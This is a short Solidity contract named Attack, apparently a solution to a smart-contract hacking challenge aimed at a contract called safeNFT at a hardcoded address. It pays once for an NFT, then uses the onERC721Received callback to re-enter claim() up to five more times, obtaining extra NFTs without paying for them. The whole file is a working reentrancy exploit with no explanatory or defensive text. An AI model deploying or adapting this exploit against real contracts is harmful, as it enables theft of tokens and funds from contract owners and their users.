// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface safeNFT {
    function buyNFT() external payable;
    function claim() external;
}

contract Attack{
    address safeNFTAddress = 0xf0337Cde99638F8087c670c80a57d470134C3AAE;
    uint c;
    uint price =10000000000000000;
    constructor() payable {
    }
    

    function buy() public payable {
        (bool sent, bytes memory data) = safeNFTAddress.call{value: price}(abi.encodeWithSignature("buyNFT()"));
        safeNFT(safeNFTAddress).claim();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        c++;
        if( c <= 5){
            safeNFT(safeNFTAddress).claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}